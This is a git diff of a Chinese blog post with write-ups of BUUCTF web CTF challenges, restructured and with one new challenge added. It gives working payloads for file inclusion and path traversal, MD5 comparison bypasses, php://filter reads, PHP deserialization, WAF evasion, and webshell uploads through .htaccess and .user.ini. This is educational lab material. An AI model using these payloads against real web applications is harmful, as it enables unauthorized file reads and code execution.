@@ -16,15 +16,15 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="BUUCTF审计&amp;HTTP[HCTF 2018]WarmUp(代码审计)源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;flag not here, and flag in ffffllllaaaagggg&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaaggg">
+    <meta name="description" content="审计&amp;HTTP&amp;正则[HCTF 2018]WarmUp(代码审计)源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;flag not here, and flag in ffffllllaaaagggg&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagg">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF">
 <meta property="og:url" content="https://junske51.github.io/kele6.github.io/2024/04/14/BUUCTF/index.html">
 <meta property="og:site_name" content="可乐">
-<meta property="og:description" content="BUUCTF审计&amp;HTTP[HCTF 2018]WarmUp(代码审计)源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;flag not here, and flag in ffffllllaaaagggg&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaaggg">
+<meta property="og:description" content="审计&amp;HTTP&amp;正则[HCTF 2018]WarmUp(代码审计)源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;flag not here, and flag in ffffllllaaaagggg&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagg">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-04-14T13:42:14.577Z">
-<meta property="article:modified_time" content="2024-04-24T13:22:04.861Z">
+<meta property="article:modified_time" content="2024-04-25T13:10:21.473Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
@@ -219,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.9k words
+          4.1k words
         
       </span>
     
@@ -230,7 +230,7 @@
         
         
         
-          33 mins
+          35 mins
         
       </span>
     
@@ -272,7 +272,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="审计-HTTP"><a href="#审计-HTTP" class="headerlink" title="审计&amp;HTTP"></a>审计&amp;HTTP</h2><h3 id="HCTF-2018-WarmUp-代码审计"><a href="#HCTF-2018-WarmUp-代码审计" class="headerlink" title="[HCTF 2018]WarmUp(代码审计)"></a>[HCTF 2018]WarmUp(代码审计)</h3><p>源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;<strong>flag not here, and flag in ffffllllaaaagggg</strong>&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagggg</p>
+                <h1 id="审计-HTTP-正则"><a href="#审计-HTTP-正则" class="headerlink" title="审计&amp;HTTP&amp;正则"></a>审计&amp;HTTP&amp;正则</h1><h2 id="HCTF-2018-WarmUp-代码审计"><a href="#HCTF-2018-WarmUp-代码审计" class="headerlink" title="[HCTF 2018]WarmUp(代码审计)"></a>[HCTF 2018]WarmUp(代码审计)</h2><p>源代码&#x3D;&#x3D;&gt;source.php&#x3D;&#x3D;&#x3D;&gt;hint.php&#x3D;&#x3D;&gt;<strong>flag not here, and flag in ffffllllaaaagggg</strong>&#x3D;&#x3D;&gt;说明flag可能在文件ffffllllaaaagggg</p>
 <p>解析source.php的代码<br><code>if (! empty($_REQUEST[&#39;file&#39;])       &amp;&amp; is_string($_REQUEST[&#39;file&#39;])&amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) &#123;       include $_REQUEST[&#39;file&#39;];exit;&#125; else &#123;echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;&#125;</code><br>一步步解析：<br>$_REQUEST</p>
 <pre><code class="hljs">    变量 $_REQUEST用于收集HTML表单提交的数据，默认情况下包含了$_GET，$_POST和$_COOKIE的数组。
 
@@ -322,7 +322,7 @@
 <p><code>$_page = mb_substr(     $page,     0,     mb_strpos($page . &#39;?&#39;, &#39;?&#39;) ); $_page = urldecode($page);</code><br><code>$_page = mb_substr(     $_page,</code><br>    <code>0,</code><br>    <code>mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)</code><br><code>);</code></p>
 <p>if语句中的$_page经历了如下改变：一次问号截断，一次url解码，一次问号截断——–url传入服务器会自动进行一次urldecode.  ?的url编码为%3F，双重url编码为%253F。</p>
 <p>那问题就很容易解决了<br>payload:?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg——-..&#x2F;代表返回上级目录——–..&#x2F;是一个一个试的，未知有几个文件夹</p>
-<h3 id="MRCTF2020-Ez-bypass-md5"><a href="#MRCTF2020-Ez-bypass-md5" class="headerlink" title="MRCTF2020]Ez_bypass(md5)"></a>MRCTF2020]Ez_bypass(md5)</h3><p><strong>代码审计</strong><br>&#x2F;&#x2F; 包含外部文<br>件 ‘flag.php’，该文件可能包含敏感信息<br>include ‘flag.php’;<br>&#x2F;&#x2F; 定义一个变量 $flag，包含一个字符串<br>$flag &#x3D; ‘MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}’;</p>
+<h2 id="MRCTF2020-Ez-bypass-md5"><a href="#MRCTF2020-Ez-bypass-md5" class="headerlink" title="MRCTF2020]Ez_bypass(md5)"></a>MRCTF2020]Ez_bypass(md5)</h2><p><strong>代码审计</strong><br>&#x2F;&#x2F; 包含外部文<br>件 ‘flag.php’，该文件可能包含敏感信息<br>include ‘flag.php’;<br>&#x2F;&#x2F; 定义一个变量 $flag，包含一个字符串<br>$flag &#x3D; ‘MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}’;</p>
 <p>&#x2F;&#x2F; 检查是否存在名为 ‘gg’ 和 ‘id’ 的 GET 参数<br>if(isset($_GET[‘gg’]) &amp;&amp; isset($_GET[‘id’])) {<br>    &#x2F;&#x2F; 获取 GET 参数 ‘id’ 和 ‘gg’ 的值<br>    $id &#x3D; $_GET[‘id’];<br>    $gg &#x3D; $_GET[‘gg’];</p>
 <pre><code class="hljs">// 检查 $id 和 $gg 的 MD5 散列值是否相等，并且它们的值不相等，强比较
 if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
@@ -369,11 +369,11 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <p><code>如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，并且不会报错，就会得到===强比较的值相等</code></p>
 <p><code>例如：para1[]=111  ,  para2[]=222</code></p>
 <p><code>此时md5（para1）=== md5（para2）</code><br>显而易见 payload：&#x2F;?id[]&#x3D;1&amp;gg[]&#x3D;2  POST:passwd&#x3D;1234567a</p>
-<h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>源代码：发现秘密：Secret.php</p>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>源代码：发现秘密：Secret.php</p>
 <p>It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://Sycsecret.buuoj.cn'==>Referer">https://Sycsecret.buuoj.cn&#39;==&gt;Referer</a></p>
 <p>Please use “Syclover” browser&#x3D;&#x3D;&gt;Uesr Agent </p>
 <p>No!!! you can only read this locally!!!&#x3D;&#x3D;&gt;X-Forwarded-For: 127.0.0.1<br>(另几种表达：X-Real-Ip: 127.0.0.1   Client-Ip: 127.0.0.1)</p>
-<h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>随便查询，无回响，查看源码，发现：<!-- /header end -->HTTP有header&#x3D;&#x3D;&gt;发现<em>Hint select * from ‘admin’ where password&#x3D;md5($pass,true)</em></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>随便查询，无回响，查看源码，发现：<!-- /header end -->HTTP有header&#x3D;&#x3D;&gt;发现<em>Hint select * from ‘admin’ where password&#x3D;md5($pass,true)</em></p>
 <p>一个sql语句，要输入一个密码但是并不知道正确密码。这里需要利用md5绕过，让sql语句变成如下形式  <strong>select * from ‘admin’ where password&#x3D;‘’ or ‘1</strong>（很基本的sql）</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/redfish404/articles/17878453.html">https://www.cnblogs.com/redfish404/articles/17878453.html</a></p>
 <p>上网查找后发现字符串“<strong>ffifdyop</strong>”和“129581926211651571912466741651878684928”在进行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=md5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">md5加密</a>后形成的十六进制的字符串经过mysql转换成十进制后对应的ASCII码内容为“or ‘ 6……”——ffifdyop-&gt;276f722736c95d99e921722cf9ed621c-&gt;’or’6É]é!r,ùíb</p>
@@ -386,7 +386,7 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML"> &lt;?phperror_reporting(0);include &quot;flag.php&quot;;<br>highlight_file(__FILE__);<br>if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))<br>&#123;  echo $flag;&#125; <br></code></pre></td></tr></table></figure>
 
 <p>这个只能数组绕过&#x3D;&#x3D;&gt;param1[]&#x3D;1&amp;param2[]&#x3D;2</p>
-<h3 id="极客大挑战-2019-BuyFlag（数组绕过长度限制）"><a href="#极客大挑战-2019-BuyFlag（数组绕过长度限制）" class="headerlink" title="[极客大挑战 2019]BuyFlag（数组绕过长度限制）"></a>[极客大挑战 2019]BuyFlag（数组绕过长度限制）</h3><p>If you want to buy the FLAG:<br>                                 You must be a student from CUIT!!!<br>                                 You must be answer the correct password!!! 	 							</p>
+<h2 id="极客大挑战-2019-BuyFlag（数组绕过长度限制）"><a href="#极客大挑战-2019-BuyFlag（数组绕过长度限制）" class="headerlink" title="[极客大挑战 2019]BuyFlag（数组绕过长度限制）"></a>[极客大挑战 2019]BuyFlag（数组绕过长度限制）</h2><p>If you want to buy the FLAG:<br>                                 You must be a student from CUIT!!!<br>                                 You must be answer the correct password!!! 	 							</p>
 <p>源代码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--<br>	~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>	<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>	<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>)) &#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>	&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br>		<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br></code></pre></td></tr></table></figure>
 
@@ -399,26 +399,28 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <p>钱减少还不够</p>
 <p>可以尝尝9e9  <strong>password&#x3D;404a&amp;money&#x3D;9e9</strong></p>
 <p>还有一个比较常见的数组绕过    <strong>password&#x3D;404a&amp;money[]&#x3D;1</strong></p>
-<h3 id="极客大挑战-2019-Secret-File-信息泄露、文件包含"><a href="#极客大挑战-2019-Secret-File-信息泄露、文件包含" class="headerlink" title="[极客大挑战 2019]Secret File(信息泄露、文件包含)"></a>[极客大挑战 2019]Secret File(信息泄露、文件包含)</h3><p>页面什么也没有，查看源代码&#x3D;&#x3D;&gt;href&#x3D;”.&#x2F;Archive_room.php”</p>
+<h2 id="极客大挑战-2019-Secret-File-信息泄露、文件包含"><a href="#极客大挑战-2019-Secret-File-信息泄露、文件包含" class="headerlink" title="[极客大挑战 2019]Secret File(信息泄露、文件包含)"></a>[极客大挑战 2019]Secret File(信息泄露、文件包含)</h2><p>页面什么也没有，查看源代码&#x3D;&#x3D;&gt;href&#x3D;”.&#x2F;Archive_room.php”</p>
 <p>打开，点击按钮，提示“没看清么？回去再仔细看看吧。”</p>
 <p>让我们退回去仔细看看，说明在这两个页面之间存在一些内容，右键「检查」<br>返回上一个页面（Archive_room.php）重新点击一次 SECRET 按钮，观察这一过程有哪些「请求」&#x3D;&#x3D;&gt;在结束页面之前，还访问了一个页面&#x2F;action.php，只是我们没有「权限」（302），看不了，所以直接跳过了这个页面。针对这种情况，使用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=burp&spm=1001.2101.3001.7020">burp</a>抓包进行访问<br>发现   secr3t.php   </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;../&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;tp&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;input&quot;</span>)||<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">&quot;data&quot;</span>))<br>&#123;    <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Oh no!&quot;</span>; <br>   <span class="hljs-keyword">exit</span>();  &#125; <br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>); <br><span class="hljs-comment">//flag放在了flag.php里?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>使用PHP伪协议对文件内容进行编码：&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php&#x3D;&#x3D;&gt;base64解码</p>
-<h3 id="RoarCTF-2019-Easy-Calc-waf"><a href="#RoarCTF-2019-Easy-Calc-waf" class="headerlink" title="[RoarCTF 2019]Easy Calc(waf)"></a>[RoarCTF 2019]Easy Calc(waf)</h3><p>源码calc.php</p>
+<h2 id="RoarCTF-2019-Easy-Calc-waf"><a href="#RoarCTF-2019-Easy-Calc-waf" class="headerlink" title="[RoarCTF 2019]Easy Calc(waf)"></a>[RoarCTF 2019]Easy Calc(waf)</h2><p>源码calc.php</p>
 <p>代码审计 num只能输入数字，字母解析不了 用空格绕过”num“改为“ num”</p>
 <p>查看黑名单 引号不能用了 </p>
 <p>用ASCII码绕过</p>
 <p> num&#x3D;var_dump(scandir(chr(47)))&#x3D;&#x3D;&gt;&gt;相当于system(ls &#x2F;)—–chr(47)&#x3D;” &#x2F; “</p>
 <p>发现f1agg文件</p>
 <p>num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))<code>==&gt;&gt;</code>file_get_contents(&#x2F;f1agg)<code>相当于</code>? num&#x3D;system(cat &#x2F;f1agg)</p>
-<h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;           echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</code><br>要求上传一个text文件，内容为<code>welcome to the zjctf</code>&#x3D;&#x3D;&gt;使用php:&#x2F;&#x2F;input或者data:&#x2F;&#x2F;<br><strong>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</strong><br><strong>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;  &#x2F;&#x2F;使用base64编码</strong></p>
+<h2 id="GXYCTF2019-禁止套娃（正则）"><a href="#GXYCTF2019-禁止套娃（正则）" class="headerlink" title="[GXYCTF2019]禁止套娃（正则）"></a>[GXYCTF2019]禁止套娃（正则）</h2><p>扫描&#x3D;&#x3D;&gt;git泄露&#x3D;&#x3D;&gt;githack&#x3D;&#x3D;&gt;index.php</p>
+<p><code>&lt;?php</code><br><code>include &quot;flag.php&quot;;</code><br><code>echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</code><br><code>if(isset($_GET[&#39;exp&#39;]))&#123;     if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;</code><br>        <code>if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;</code><br>            <code>if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;                 // echo $_GET[&#39;exp&#39;];</code><br>                <code>@eval($_GET[&#39;exp&#39;]);</code><br>            <code>&#125;</code><br>            <code>else&#123;</code><br>                <code>die(&quot;还差一点哦！&quot;);</code><br>            <code>&#125;</code><br>        <code>&#125;</code><br>        <code>else&#123;</code><br>            <code>die(&quot;再好好想想！&quot;);</code><br>        <code>&#125;</code><br>    <code>&#125;</code><br>    <code>else&#123;</code><br>        <code>die(&quot;还想读flag，臭弟弟！&quot;);</code><br>    <code>&#125;</code><br><code>&#125;</code><br><code>// highlight_file(__FILE__);</code><br><code>?&gt;</code></p>
+<h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><code>if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;           echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;</code><br>要求上传一个text文件，内容为<code>welcome to the zjctf</code>&#x3D;&#x3D;&gt;使用php:&#x2F;&#x2F;input或者data:&#x2F;&#x2F;<br><strong>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</strong><br><strong>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;  &#x2F;&#x2F;使用base64编码</strong></p>
 <p>file伪协议&#x3D;&#x3D;&gt;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
 <p>进行base解码 得到代码</p>
 <p><code>&lt;?php</code>  </p>
 <p><code>class Flag&#123;  //flag.php       public $file;       public function __tostring()&#123;           if(isset($this-&gt;file))&#123;               echo file_get_contents($this-&gt;file);</code><br>            <code>echo &quot;&lt;br&gt;&quot;;</code><br>        <code>return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);</code><br>        <code>&#125;       &#125;   &#125;   ?&gt;</code>  </p>
 <p>进行序列化得到O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
-<h3 id="极客大挑战-2019-PHP（反序列化）"><a href="#极客大挑战-2019-PHP（反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（反序列化）"></a>[极客大挑战 2019]PHP（反序列化）</h3><p>备份网站&#x3D;&#x3D;&gt;dirsezrch -u <a target="_blank" rel="noopener" href="http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==%3Ewww.zip%E6%96%87%E4%BB%B6(%E7%9B%B4%E6%8E%A5%E5%9C%A8url%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E6%8B%BC%E6%8E%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5)">http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==&gt;www.zip文件(直接在url网址后面拼接就可以)</a></p>
+<h2 id="极客大挑战-2019-PHP（反序列化）"><a href="#极客大挑战-2019-PHP（反序列化）" class="headerlink" title="[极客大挑战 2019]PHP（反序列化）"></a>[极客大挑战 2019]PHP（反序列化）</h2><p>备份网站&#x3D;&#x3D;&gt;dirsezrch -u <a target="_blank" rel="noopener" href="http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==%3Ewww.zip%E6%96%87%E4%BB%B6(%E7%9B%B4%E6%8E%A5%E5%9C%A8url%E7%BD%91%E5%9D%80%E5%90%8E%E9%9D%A2%E6%8B%BC%E6%8E%A5%E5%B0%B1%E5%8F%AF%E4%BB%A5)">http://ae4f66fd-39d2-4ca2-93f2-e3b29093f58c.node5.buuoj.cn:81/==&gt;www.zip文件(直接在url网址后面拼接就可以)</a></p>
 <p>文件夹源码挨个看</p>
 <p>index.php<br><code>&lt;?php</code></p>
 <p>  <code>include &#39;class.php&#39;;</code></p>
@@ -459,7 +461,7 @@ if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;
 <p>?select&#x3D;O:4:”Name”:2:{s:13:” Name username”;s:5:”admin”;s:13:” Name password”;s:3:100;}<br>仍然不行  </p>
 <p>可能空格没有被实体化  这里我们需要把空格写出来<br> 而空格的url编码是%00，下面构造我们的payload </p>
 <p>?select&#x3D;O:4:”Name”:3 {s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}</p>
-<h3 id="网鼎杯-2020-青龙组-AreUSerialz（反序列化）"><a href="#网鼎杯-2020-青龙组-AreUSerialz（反序列化）" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz（反序列化）"></a>[网鼎杯 2020 青龙组]AreUSerialz（反序列化）</h3><p>构造POP链</p>
+<h2 id="网鼎杯-2020-青龙组-AreUSerialz（反序列化）"><a href="#网鼎杯-2020-青龙组-AreUSerialz（反序列化）" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz（反序列化）"></a>[网鼎杯 2020 青龙组]AreUSerialz（反序列化）</h2><p>构造POP链</p>
 <p>不使用题目中原有的各个字段的protect属性，因为这样会使得序列化后的字符串出现不可打印字符，而题目中的is_valid()函数又会检验输入的字符串中是否有不可打印字符，因此，我们这里把protect属性修改为public。</p>
 <?php
 
@@ -483,9 +485,9 @@ echo $str1;
 
 <p>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p>
 <p>payload： ?str&#x3D;O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:10:”.&#x2F;flag.php”;s:7:”content”;N;}</p>
-<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><h3 id="极客大挑战-2019-Knife-一句话木马、代码执行"><a href="#极客大挑战-2019-Knife-一句话木马、代码执行" class="headerlink" title="[极客大挑战 2019]Knife(一句话木马、代码执行)"></a>[极客大挑战 2019]Knife(一句话木马、代码执行)</h3><h5 id="Way1（代码执行）"><a href="#Way1（代码执行）" class="headerlink" title="Way1（代码执行）"></a>Way1（代码执行）</h5><p>显示 eval($_POST[“Syc”]);<br>POST: Syc&#x3D;var_dump(scandir(‘&#x2F;‘));—查看源代码 发现flag</p>
+<h1 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h1><h2 id="极客大挑战-2019-Knife-一句话木马、代码执行"><a href="#极客大挑战-2019-Knife-一句话木马、代码执行" class="headerlink" title="[极客大挑战 2019]Knife(一句话木马、代码执行)"></a>[极客大挑战 2019]Knife(一句话木马、代码执行)</h2><h5 id="Way1（代码执行）"><a href="#Way1（代码执行）" class="headerlink" title="Way1（代码执行）"></a>Way1（代码执行）</h5><p>显示 eval($_POST[“Syc”]);<br>POST: Syc&#x3D;var_dump(scandir(‘&#x2F;‘));—查看源代码 发现flag</p>
 <h5 id="Way2（蚁剑）"><a href="#Way2（蚁剑）" class="headerlink" title="Way2（蚁剑）"></a>Way2（蚁剑）</h5><p>复制URL 密码：Syc  找flag文件</p>
-<h3 id="MRCTF2020-你传你🐎呢-htaccess绕过"><a href="#MRCTF2020-你传你🐎呢-htaccess绕过" class="headerlink" title="[MRCTF2020]你传你🐎呢(.htaccess绕过)"></a>[MRCTF2020]你传你🐎呢(.htaccess绕过)</h3><p>随便上传，有限制 尝试了php3,php5,ptml,空格绕过,都不行</p>
+<h2 id="MRCTF2020-你传你🐎呢-htaccess绕过"><a href="#MRCTF2020-你传你🐎呢-htaccess绕过" class="headerlink" title="[MRCTF2020]你传你🐎呢(.htaccess绕过)"></a>[MRCTF2020]你传你🐎呢(.htaccess绕过)</h2><p>随便上传，有限制 尝试了php3,php5,ptml,空格绕过,都不行</p>
 <p>先上次1.png   &#x2F;&#x2F;与后面的png文件名一致</p>
 <p>尝试.htaccess</p>
 <p>内容：<br><code>&lt;FilesMatch &quot;1.png&quot;&gt;</code><br><code>SetHandler application/x-httpd-php</code><br><code>&lt;/FilesMatch&gt;</code></p>
@@ -493,15 +495,15 @@ echo $str1;
 <p>复制网址：&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>.htaccess</strong></p>
 <p>改为&#x2F;upload&#x2F;731ae4223a74740c27bb86b66c482220&#x2F;<strong>1.png</strong></p>
 <p>踩坑：<em>这里要把.htaccess改为1.png，因为密码cmd是对应的1.png</em></p>
-<h3 id="SUCTF-2019-CheckIn-user-ini绕过"><a href="#SUCTF-2019-CheckIn-user-ini绕过" class="headerlink" title="[SUCTF 2019]CheckIn(.user.ini绕过)"></a>[SUCTF 2019]CheckIn(.user.ini绕过)</h3><p>illegal suffix! 尝试不同文件上传 发现只有jpg回显回显&lt;? in contents!</p>
+<h2 id="SUCTF-2019-CheckIn-user-ini绕过"><a href="#SUCTF-2019-CheckIn-user-ini绕过" class="headerlink" title="[SUCTF 2019]CheckIn(.user.ini绕过)"></a>[SUCTF 2019]CheckIn(.user.ini绕过)</h2><p>illegal suffix! 尝试不同文件上传 发现只有jpg回显回显&lt;? in contents!</p>
 <p>看来只能是jpg 然后需要绕过 &lt;?  :<code>&lt;script language=&#39;php&#39;&gt;eval($_POST[&#39;shell&#39;]);&lt;scirpt&gt;</code></p>
 <p>需要把jpg当做PHP文件执行，尝试.htaccess文件，然后还是不行： 回显exif_imagetype:not image!</p>
 <p>这时想到**.user.ini**绕过：</p>
 <p><code>GIF89a</code><br><code>auto_prepend_file=a.jpg</code>&#x2F;&#x2F;a.jpg要与上传的jpg文件名称相同</p>
 <p>重新尝试：先.user.ini 后 a.jpg </p>
 <p>蚁剑连接，注意最后是&#x2F;index.php———使用的是auto_prepend_file，在主文件之前就已经自动解析文件名了，所以index.php主文件在最后面，而不是a.jpg</p>
-<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="极客大挑战-2019-BabySQL-双写绕过"><a href="#极客大挑战-2019-BabySQL-双写绕过" class="headerlink" title="[极客大挑战 2019]BabySQL(双写绕过)"></a>[极客大挑战 2019]BabySQL(双写绕过)</h3><p>会双写绕过就能过（其他按部就班）</p>
-<h3 id="极客大挑战-2019-HardSQL-报错注入"><a href="#极客大挑战-2019-HardSQL-报错注入" class="headerlink" title="[极客大挑战 2019]HardSQL(报错注入)"></a>[极客大挑战 2019]HardSQL(报错注入)</h3><p>万能密码不管用。大写、</p>
+<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="极客大挑战-2019-BabySQL-双写绕过"><a href="#极客大挑战-2019-BabySQL-双写绕过" class="headerlink" title="[极客大挑战 2019]BabySQL(双写绕过)"></a>[极客大挑战 2019]BabySQL(双写绕过)</h2><p>会双写绕过就能过（其他按部就班）</p>
